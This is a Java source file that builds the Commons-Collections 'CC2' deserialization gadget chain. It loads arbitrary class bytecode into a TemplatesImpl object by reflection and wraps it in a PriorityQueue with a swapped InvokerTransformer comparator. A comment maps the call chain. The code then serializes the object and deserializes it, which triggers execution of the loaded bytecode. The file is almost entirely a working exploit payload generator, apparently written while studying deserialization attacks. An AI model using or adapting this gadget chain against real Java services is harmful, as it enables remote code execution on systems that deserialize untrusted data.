package CC2;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.*;

/*
PriorityQueue#readObject() -> PriorityQueue#heapify() -> PriorityQueue#siftDown() ->
PriorityQueue#siftDownUsingComparator() -> TransformingComparator#compare() ->
InvokerTransformer#transform() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() ->
TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
 */

public class CC2 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaa");
        byte[] code = Files.readAllBytes(Paths.get("E:\\IdeaProjects\\反序列化链\\HelloTemplatesImpl.class"));
        byte[][] bytecodes = {code};
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        //这里还是先放一个无关的到TransformingComparator，后面再改回来，防止priorityQueue.add();后面也会调用到compare
        Comparator ioTransformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(ioTransformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(templates);

        setValue(ioTransformingComparator,"transformer",invokerTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
